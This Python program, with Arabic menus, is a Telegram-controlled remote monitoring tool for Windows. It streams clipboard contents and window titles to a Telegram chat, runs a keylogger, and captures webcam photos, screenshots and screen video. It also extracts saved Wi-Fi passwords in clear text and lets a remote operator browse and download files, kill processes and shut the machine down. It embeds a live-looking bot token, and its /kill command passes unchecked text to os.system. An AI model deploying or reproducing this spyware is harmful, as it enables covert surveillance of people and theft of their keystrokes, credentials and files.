import os
import sys
import time
import psutil
import pyautogui
import cv2
import requests
import pyttsx3
import pyperclip
import ctypes
import datetime
import webbrowser
import threading
import subprocess
import platform
import win32gui
import numpy as np
from pynput import keyboard
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ==========================================
# ⚙️ الإعدادات (CONFIGURATION)
# ==========================================

TOKEN = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0"
ADMIN_IDS = [1431886140]

DEVICE_ID = "LAPTOP_MAHMOUD" 
KNOWN_DEVICES = ["LAPTOP_MAHMOUD", "PC_HOME", "WORK_LAPTOP"]

# مسارات الحفظ
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود_System_V19")
VIDEO_FOLDER = os.path.join(SAVE_DIR, "تسجيل_فيديو")
LOGS_FOLDER = os.path.join(SAVE_DIR, "سجلات_كيبورد")
CAM_FOLDER = os.path.join(SAVE_DIR, "صور_الكاميرا_التلقائية")

# إنشاء المجلدات
for folder in [SAVE_DIR, VIDEO_FOLDER, LOGS_FOLDER, CAM_FOLDER]:
    if not os.path.exists(folder):
        try: os.makedirs(folder)
        except: pass

# متغيرات التحكم
FLAGS = {
    "keylogger": False,
    "aggressive_monitor": False, # وضع المراقبة الفوري
    "video_rec": False
}
LOGGED_KEYS = []
CLIPBOARD_HISTORY = []
CURRENT_TARGET = "ALL" 
FILE_CACHE = {} 
CURRENT_PATH = os.getcwd()

# قائمة التجاهل (لمنع تكرار إرسال نصوص الأزرار)
IGNORE_TEXTS = [
    '🎯 تحديد الهدف', '🖥️ المراقبة', '👻 الشبح', '🛡️ الأمان',
    '📂 الملفات', '🌐 الشبكة', '🚀 الإنتاجية', '⚡ الطاقة',
    '📸 لقطة شاشة', '👁️ صورة كاميرا', '🔴 بدء تسجيل فيديو', 
    '⏹ إيقاف التسجيل', '⏱️ وقت التشغيل', 'ℹ️ معلومات النظام',
    '🔄 تشغيل Auto-Mode', '⏹ إيقاف Auto-Mode', '🔙 القائمة الرئيسية',
    '🔒 قفل', '💤 سكون', '🛑 إيقاف التشغيل', '🔄 إعادة تشغيل',
    '📩 رسالة منبثقة', '🖼️ تغيير خلفية', '🔊 التحكم بالصوت',
    '⌨️ تشغيل Keylogger', '⏹ إيقاف Keylogger', '🕵️ صورة دخيل', 
    '☠️ قتل برنامج', '📂 متصفح الملفات', '📋 نسخ الحافظة',
    '🔐 باسوردات الواي فاي', '🔗 اتصال بشبكة', '📡 فحص الشبكات', 
    '🚀 سرعة النت', '🌍 IP عام', '📚 وضع المذاكرة', '💻 وضع البرمجة', 
    '🚨 زر الطوارئ', '🛠️ أدوات إضافية', '🔊 رفع', '🔉 خفض', '🔇 كتم'
]

# ==========================================
# 🛠️ دوال المساعدة
# ==========================================

def is_targeted():
    """التحقق من الاستهداف"""
    if CURRENT_TARGET == "ALL": return True
    if CURRENT_TARGET == DEVICE_ID: return True
    return False

def send_sync_msg(text):
    if not is_targeted(): return 
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for admin in ADMIN_IDS:
            requests.post(url, data={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
    except: pass

def force_send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for admin in ADMIN_IDS:
            requests.post(url, data={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_sync_photo(file_path, caption=""):
    if not is_targeted(): return
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"photo": f})
    except: pass

def send_sync_doc(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        for admin in ADMIN_IDS:
            with open(file_path, 'rb') as f:
                requests.post(url, data={"chat_id": admin, "caption": caption}, files={"document": f})
    except: pass

# ==========================================
# 🕵️‍♂️ خيوط المراقبة (المعدلة للإرسال الفوري)
# ==========================================

def auto_monitor_loop():
    last_clip = ""
    last_win = ""  
    
    print("✅ Real-Time Monitor Started...")
    
    while True:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        ts_file = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")

        # 1. مراقبة النوافذ (فوري)
        try:
            win = win32gui.GetForegroundWindow()
            txt = win32gui.GetWindowText(win)
            # إذا تغير اسم النافذة، أرسل فوراً
            if txt and txt != last_win and len(txt) > 1:
                last_win = txt
                if is_targeted():
                    send_sync_msg(f"👀 **فتح الآن ({DEVICE_ID}):**\n`{txt}`")
        except: pass

        # 2. مراقبة الحافظة (فوري)
        try:
            curr_clip = pyperclip.paste()
            if curr_clip and curr_clip != last_clip:
                last_clip = curr_clip
                CLIPBOARD_HISTORY.append(f"[{timestamp}] {curr_clip}")
                if len(CLIPBOARD_HISTORY) > 10: CLIPBOARD_HISTORY.pop(0)
                if is_targeted():
                    send_sync_msg(f"📋 **نسخ جديد:**\n`{curr_clip}`")
        except: pass

        # 3. وضع المراقبة الفوري (صور وكاميرا)
        if FLAGS["aggressive_monitor"]:
            try:
                # لقطة شاشة وإرسال فوري
                scr_path = os.path.join(SAVE_DIR, "auto_scr.png")
                pyautogui.screenshot(scr_path)
                send_sync_photo(scr_path, caption=f"🖥️ Live Screen: {timestamp}")
                
                # لقطة كاميرا وإرسال فوري
                cap = cv2.VideoCapture(0)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        cam_path = os.path.join(CAM_FOLDER, f"Cam_{ts_file}.jpg")
                        cv2.imwrite(cam_path, frame)
                        send_sync_photo(cam_path, caption=f"👁️ Live Cam: {timestamp}")
                    cap.release()
            except: pass
            
            # ⚠️ تأخير بسيط جداً (2 ثانية) لتجنب حظر البوت من كثرة الإرسال
            time.sleep(2) 
        else:
            # إذا لم يكن الوضع مفعلاً، افحص النوافذ والحافظة كل ثانية
            time.sleep(1)

def keylogger_loop():
    def on_press(key):
        if FLAGS["keylogger"]:
            try: LOGGED_KEYS.append(key.char)
            except: LOGGED_KEYS.append(f"[{str(key).replace('Key.', '')}]")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=auto_monitor_loop, daemon=True).start()
threading.Thread(target=keylogger_loop, daemon=True).start()

# ==========================================
# 📂 مدير الملفات
# ==========================================

def get_file_keyboard(path):
    global FILE_CACHE
    FILE_CACHE = {} 
    keyboard = []
    try:
        items = os.listdir(path)
        keyboard.append([InlineKeyboardButton("⬆️ لأعلى", callback_data="DIR_UP"), InlineKeyboardButton("🏠 الرئيسية", callback_data="DIR_HOME")])
        idx = 0
        dirs = [d for d in items if os.path.isdir(os.path.join(path, d))][:6]
        for d in dirs:
            FILE_CACHE[str(idx)] = d
            keyboard.append([InlineKeyboardButton(f"📁 {d}", callback_data=f"NAV|{idx}")])
            idx += 1
        files = [f for f in items if os.path.isfile(os.path.join(path, f))][:6]
        for f in files:
            FILE_CACHE[str(idx)] = f
            keyboard.append([InlineKeyboardButton(f"📄 {f}", callback_data=f"DL|{idx}")])
            idx += 1
    except: keyboard.append([InlineKeyboardButton("❌ خطأ وصول", callback_data="NONE")])
    return InlineKeyboardMarkup(keyboard)

# ==========================================
# 🎮 القوائم
# ==========================================

main_kb = [
    [KeyboardButton("🎯 تحديد الهدف"), KeyboardButton("🖥️ المراقبة")],
    [KeyboardButton("👻 الشبح"), KeyboardButton("🛡️ الأمان")],
    [KeyboardButton("📂 الملفات"), KeyboardButton("🌐 الشبكة")],
    [KeyboardButton("🚀 الإنتاجية"), KeyboardButton("⚡ الطاقة")]
]

monitor_kb = [
    [KeyboardButton("📸 لقطة شاشة"), KeyboardButton("👁️ صورة كاميرا")],
    [KeyboardButton("🔴 بدء تسجيل فيديو"), KeyboardButton("⏹ إيقاف التسجيل")],
    [KeyboardButton("⏱️ وقت التشغيل"), KeyboardButton("ℹ️ معلومات النظام")],
    [KeyboardButton("🔄 تشغيل Auto-Mode"), KeyboardButton("⏹ إيقاف Auto-Mode")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

power_kb = [
    [KeyboardButton("🔒 قفل"), KeyboardButton("💤 سكون")],
    [KeyboardButton("🛑 إيقاف التشغيل"), KeyboardButton("🔄 إعادة تشغيل")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

ghost_kb = [
    [KeyboardButton("📩 رسالة منبثقة"), KeyboardButton("🖼️ تغيير خلفية")],
    [KeyboardButton("🔊 التحكم بالصوت"), KeyboardButton("🔙 القائمة الرئيسية")]
]

security_kb = [
    [KeyboardButton("⌨️ تشغيل Keylogger"), KeyboardButton("⏹ إيقاف Keylogger")],
    [KeyboardButton("🕵️ صورة دخيل"), KeyboardButton("☠️ قتل برنامج")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

files_kb = [
    [KeyboardButton("📂 متصفح الملفات"), KeyboardButton("📋 نسخ الحافظة")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

network_kb = [
    [KeyboardButton("🔐 باسوردات الواي فاي"), KeyboardButton("🔗 اتصال بشبكة")],
    [KeyboardButton("📡 فحص الشبكات"), KeyboardButton("🚀 سرعة النت")],
    [KeyboardButton("🌍 IP عام"), KeyboardButton("🔙 القائمة الرئيسية")]
]

prod_kb = [
    [KeyboardButton("📚 وضع المذاكرة"), KeyboardButton("💻 وضع البرمجة")],
    [KeyboardButton("🚨 زر الطوارئ"), KeyboardButton("🛠️ أدوات إضافية")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

audio_kb = [
    [KeyboardButton("🔊 رفع"), KeyboardButton("🔉 خفض"), KeyboardButton("🔇 كتم")],
    [KeyboardButton("🔙 القائمة الرئيسية")]
]

def get_target_kb():
    buttons = [[KeyboardButton("📢 الكل (All Devices)")]]
    row = []
    for dev in KNOWN_DEVICES:
        row.append(KeyboardButton(f"💻 {dev}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row: buttons.append(row)
    buttons.append([KeyboardButton("🔙 القائمة الرئيسية")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

# ==========================================
# 🤖 معالج الأوامر
# ==========================================

def is_admin(uid): return uid in ADMIN_IDS

async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_TARGET, LOGGED_KEYS, FLAGS
    if not is_admin(update.effective_user.id): return
    msg = update.message.text
    
    if msg == "🎯 تحديد الهدف":
        await update.message.reply_text(f"🎯 **الهدف:** {CURRENT_TARGET}", reply_markup=get_target_kb())
        return
    elif msg == "📢 الكل (All Devices)":
        CURRENT_TARGET = "ALL"
        await update.message.reply_text(f"✅ {DEVICE_ID}: وضع الاستقبال العام.", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return
    elif msg.startswith("💻 "):
        target_name = msg.replace("💻 ", "")
        CURRENT_TARGET = target_name
        if DEVICE_ID == target_name:
            await update.message.reply_text(f"✅ **{DEVICE_ID}**: تم التحديد.", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return

    if msg in ["/start", "🔙 القائمة الرئيسية"]:
        await update.message.reply_text(f"🕹️ **{DEVICE_ID}** (Target: {CURRENT_TARGET})", reply_markup=ReplyKeyboardMarkup(main_kb, resize_keyboard=True))
        return

    if not is_targeted(): return 

    if msg == "🖥️ المراقبة": await update.message.reply_text("👁️", reply_markup=ReplyKeyboardMarkup(monitor_kb, resize_keyboard=True))
    elif msg == "⚡ الطاقة": await update.message.reply_text("⚡", reply_markup=ReplyKeyboardMarkup(power_kb, resize_keyboard=True))
    elif msg == "👻 الشبح": await update.message.reply_text("👻", reply_markup=ReplyKeyboardMarkup(ghost_kb, resize_keyboard=True))
    elif msg == "🛡️ الأمان": await update.message.reply_text("🛡️", reply_markup=ReplyKeyboardMarkup(security_kb, resize_keyboard=True))
    elif msg == "📂 الملفات": await update.message.reply_text("📂", reply_markup=ReplyKeyboardMarkup(files_kb, resize_keyboard=True))
    elif msg == "🌐 الشبكة": await update.message.reply_text("🌐", reply_markup=ReplyKeyboardMarkup(network_kb, resize_keyboard=True))
    elif msg == "🚀 الإنتاجية": await update.message.reply_text("🚀", reply_markup=ReplyKeyboardMarkup(prod_kb, resize_keyboard=True))
    elif msg == "🛠️ أدوات إضافية": await update.message.reply_text("🛠️", reply_markup=ReplyKeyboardMarkup(audio_kb, resize_keyboard=True))

    elif msg == "⌨️ تشغيل Keylogger":
        FLAGS["keylogger"] = True; LOGGED_KEYS = [] 
        await update.message.reply_text("✅ Keylogger Started.")
    elif msg == "⏹ إيقاف Keylogger":
        FLAGS["keylogger"] = False
        await update.message.reply_text("🛑 Keylogger Stopped.")
        if LOGGED_KEYS:
            file_name = os.path.join(LOGS_FOLDER, f"Keys_{datetime.datetime.now().strftime('%H-%M-%S')}.txt")
            with open(file_name, "w", encoding="utf-8") as f: f.write("".join(LOGGED_KEYS))
            try: await update.message.reply_document(open(file_name, "rb"), caption=f"📝 {DEVICE_ID}")
            except: pass
        else: await update.message.reply_text("📭 Log Empty.")

    elif msg == "🔐 باسوردات الواي فاي":
        await update.message.reply_text("⏳ Extracting...")
        try:
            d = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
            p = [i.split(":")[1][1:-1] for i in d.split('\n') if "All User Profile" in i]
            res = ""
            for i in p:
                try:
                    r = subprocess.check_output(f'netsh wlan show profile name="{i}" key=clear', shell=True).decode('cp850', errors='ignore')
                    k = [b.split(":")[1][1:-1] for b in r.split('\n') if "Key Content" in b]
                    res += f"📡 {i}: {k[0]}\n"
                except: res += f"📡 {i}: (Open)\n"
            if len(res) > 4000:
                 with open("wifi_pass.txt", "w", encoding="utf-8") as f: f.write(res)
                 await update.message.reply_document(open("wifi_pass.txt", "rb"))
                 os.remove("wifi_pass.txt")
            else: await update.message.reply_text(res if res else "Not Found.")
        except: await update.message.reply_text("❌ Error")

    elif msg == "🚀 سرعة النت":
        await update.message.reply_text("⏳ Speedtest running...")
        def run_speedtest():
            try:
                import speedtest
                st = speedtest.Speedtest()
                st.get_best_server()
                res = f"🚀 **{DEVICE_ID}:**\n⬇️ {st.download()/1024/1024:.2f} Mbps\n⬆️ {st.upload()/1024/1024:.2f} Mbps\n📶 Ping: {st.results.ping} ms"
                send_sync_msg(res)
            except: send_sync_msg("❌ Speedtest Error")
        threading.Thread(target=run_speedtest).start()

    elif msg == "📡 فحص الشبكات":
        try:
            res = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors='ignore')
            await update.message.reply_text(f"📡 Networks:\n{res}")
        except: await update.message.reply_text("❌ Error")

    elif msg == "🔗 اتصال بشبكة": await update.message.reply_text("اكتب: `/connect SSID,PASS`")
    elif msg == "🌍 IP عام":
        try: await update.message.reply_text(f"🌐 `{requests.get('https://api.ipify.org').text}`")
        except: pass

    elif msg == "📸 لقطة شاشة":
        p = os.path.join(SAVE_DIR, "manual_scr.png")
        pyautogui.screenshot(p); await update.message.reply_photo(open(p,'rb')); os.remove(p)
    
    elif msg == "👁️ صورة كاميرا":
        cap=cv2.VideoCapture(0); ret,f=cap.read()
        if ret:
            p = os.path.join(CAM_FOLDER, "manual_cam.jpg")
            cv2.imwrite(p,f); cap.release(); await update.message.reply_photo(open(p,'rb'))
        else: await update.message.reply_text("❌ Cam Error")
    
    elif msg == "🔴 بدء تسجيل فيديو":
        if FLAGS["video_rec"]: await update.message.reply_text("⚠️ Already Recording")
        else:
            FLAGS["video_rec"] = True
            await update.message.reply_text("🎥 Recording started...")
            def rec():
                try:
                    p = os.path.join(VIDEO_FOLDER, f"Vid_{datetime.datetime.now().strftime('%H-%M-%S')}.avi")
                    out = cv2.VideoWriter(p, cv2.VideoWriter_fourcc(*"XVID"), 10.0, pyautogui.size())
                    while FLAGS["video_rec"]:
                        img = pyautogui.screenshot()
                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                        out.write(frame); time.sleep(0.05)
                    out.release()
                    send_sync_msg("⏳ Uploading Video...")
                    send_sync_doc(p, caption="🎥 Video Saved")
                except: FLAGS["video_rec"] = False
            threading.Thread(target=rec).start()

    elif msg == "⏹ إيقاف التسجيل":
        FLAGS["video_rec"] = False
        await update.message.reply_text("🛑 Stopping...")

    # --- المراقبة الفورية (Live) ---
    elif msg == "🔄 تشغيل Auto-Mode":
        FLAGS["aggressive_monitor"] = True
        await update.message.reply_text("✅ تم تفعيل المراقبة الفورية (Live Monitoring).\n⚠️ سيتم إرسال الصور كل 2 ثانية.")
    elif msg == "⏹ إيقاف Auto-Mode":
        FLAGS["aggressive_monitor"] = False
        await update.message.reply_text("🛑 تم إيقاف المراقبة الفورية.")

    elif msg == "🔊 رفع": [pyautogui.press('volumeup') for _ in range(5)]; await update.message.reply_text("🔊 Up")
    elif msg == "🔉 خفض": [pyautogui.press('volumedown') for _ in range(5)]; await update.message.reply_text("🔉 Down")
    elif msg == "🔇 كتم": pyautogui.press('volumemute'); await update.message.reply_text("🔇 Mute")

    elif msg == "🔒 قفل": ctypes.windll.user32.LockWorkStation()
    elif msg == "🛑 إيقاف التشغيل": os.system("shutdown /s /t 5")
    elif msg == "🔄 إعادة تشغيل": os.system("shutdown /r /t 5")
    elif msg == "💤 سكون": os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

    elif msg == "📩 رسالة منبثقة": await update.message.reply_text("اكتب: `/msg النص`")
    elif msg == "🖼️ تغيير خلفية": await update.message.reply_text("أرسل الصورة مع تعليق `/wallpaper`")

    elif msg == "📂 متصفح الملفات":
        global CURRENT_PATH; CURRENT_PATH = os.getcwd()
        await update.message.reply_text(f"📂 {CURRENT_PATH}", reply_markup=get_file_keyboard(CURRENT_PATH))
    elif msg == "📋 نسخ الحافظة": await update.message.reply_text(f"📋\n{pyperclip.paste()}")

    elif msg == "☠️ قتل برنامج": await update.message.reply_text("اكتب: `/kill اسم_البرنامج`")
    elif msg == "🕵️ صورة دخيل": 
        cap=cv2.VideoCapture(0); ret,f=cap.read()
        if ret: 
            p="intruder.jpg"; cv2.imwrite(p,f); cap.release()
            await update.message.reply_photo(open(p,'rb')); os.remove(p)

async def smart_copy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_targeted(): return
    if not is_admin(update.effective_user.id): return
    txt = update.message.text
    if txt.startswith("/") or txt in IGNORE_TEXTS: return
    try:
        pyperclip.copy(txt)
        await update.message.reply_text(f"✅ Copied to Clipboard:\n`{txt}`")
    except: pass

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id) or not is_targeted(): return
    txt = update.message.text
    if txt.startswith("/msg "): threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt.replace("/msg ", ""), "Admin", 0x40 | 0x1000)).start(); await update.message.reply_text("✅ Sent")
    elif txt.startswith("/open "): webbrowser.open(txt.replace("/open ", ""))
    elif txt.startswith("/kill "): os.system(f"taskkill /f /im {txt.replace('/kill ', '')}.exe")
    elif txt.startswith("/say "): threading.Thread(target=lambda: pyttsx3.speak(txt.replace("/say ", ""))).start()
    elif txt.startswith("/type "): pyautogui.write(txt.replace("/type ", ""))
    elif txt.startswith("/connect "):
        try:
            creds = txt.replace("/connect ", "").split(",")
            ssid, pwd = creds[0].strip(), creds[1].strip()
            xml = f"""<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{ssid}</name><SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{pwd}</keyMaterial></sharedKey></MSM></MSM></WLANProfile>"""
            with open("wifi_config.xml", "w") as f: f.write(xml)
            subprocess.run('netsh wlan add profile filename="wifi_config.xml"', shell=True)
            subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
            os.remove("wifi_config.xml")
            await update.message.reply_text(f"📡 Connecting to {ssid}...")
        except: await update.message.reply_text("❌ Format: /connect SSID,PASS")

async def file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_targeted(): return 
    query = update.callback_query; await query.answer(); data = query.data
    global CURRENT_PATH
    if data == "DIR_UP": CURRENT_PATH = os.path.dirname(CURRENT_PATH)
    elif data == "DIR_HOME": CURRENT_PATH = os.path.expanduser("~")
    elif data.startswith("NAV|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE: CURRENT_PATH = os.path.join(CURRENT_PATH, FILE_CACHE[idx])
    elif data.startswith("DL|"):
        idx = data.split("|")[1]
        if idx in FILE_CACHE:
            try: await query.message.reply_document(open(os.path.join(CURRENT_PATH, FILE_CACHE[idx]), 'rb'))
            except Exception as e: await query.message.reply_text(f"❌ {e}")
        return
    await query.edit_message_text(f"📂 `{CURRENT_PATH}`", reply_markup=get_file_keyboard(CURRENT_PATH))

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_targeted(): return
    if update.message.caption and "/wallpaper" in update.message.caption:
        f = await update.message.photo[-1].get_file()
        p = os.path.join(SAVE_DIR, "bg.jpg")
        await f.download_to_drive(p)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(p), 0)
        await update.message.reply_text("🖼️ Wallpaper Changed.")

def main():
    print(f"🚀 ULTIMATE REAL-TIME SYSTEM: {DEVICE_ID}")
    force_send_msg(f"🟢 **System Online:** {DEVICE_ID}\n📅 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CallbackQueryHandler(file_callback))
    app.add_handler(MessageHandler(filters.Regex("^/"), cmd_handler))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(🎯|📢|💻|🖥️|⚡|👻|🛡️|📂|🌐|🚀|🛠️|📸|👁️|🔴|⏹|⏱️|ℹ️|🔄|🔙|🔒|💤|🛑|📩|🖼️|🔊|⌨️|🕵️|☠️|📋|🔐|🔗|📡|🌍|📚|🚨|🔉|🔇)"), menu_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, smart_copy_handler))
    app.run_polling()

if __name__ == '__main__':
    main()